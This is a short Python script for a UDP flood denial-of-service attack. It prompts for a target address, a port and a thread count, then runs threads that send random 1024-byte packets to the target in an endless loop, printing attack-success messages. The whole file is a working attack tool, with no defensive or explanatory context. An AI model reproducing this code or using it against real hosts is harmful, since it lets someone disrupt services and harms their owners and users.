import sys
import time
import sys
import socket
import random
from threading import Thread

def udp():
        tar = (url,port)
        bytes = random._urandom(1024)
        while True:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                try:
                        s.sendto(bytes,tar)
                        print("[root@Attack ~]#Sucess Sent Udp Attack To ---> " + str(url) + " 1024 b/s")
                except:
                        print("[root@Error ~]#Network Maybe Down...Retry")
                        sys.exit()

url = str(input("[root@Target ~]#"))
port = int(input("[root@Port ~]#"))
thr = int(input("[root@Threads ~]#"))
for i in range(thr):
        i = Thread(target=udp, name=(i))
        i.start()
